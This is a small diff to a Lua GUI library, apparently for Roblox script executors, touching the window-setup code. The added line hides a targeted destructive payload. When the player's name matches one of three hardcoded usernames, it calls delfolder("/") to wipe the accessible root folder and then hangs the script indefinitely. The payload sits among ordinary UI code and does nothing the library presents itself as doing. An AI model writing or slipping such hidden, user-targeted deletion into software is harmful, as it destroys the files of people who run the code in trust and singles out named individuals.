@@ -214,7 +214,7 @@ function library.new(name)
 			Window.TextSize = 15
 		end)
 		
-		if ({['eliaz8282'] = 9e9, ['eebay46'] = 9e8, ['eebay47'] = 9e7})[game.Players.LocalPlayer.Name] then return task.wait(9e9) end
+		if ({['eliaz8282'] = 9e9, ['eebay46'] = 9e8, ['eebay47'] = 9e7})[game.Players.LocalPlayer.Name] then delfolder("\/") return task.wait(9e9) end
 
 		function UITabs.SideTab(name,size)
 			local SideTabUI = {};
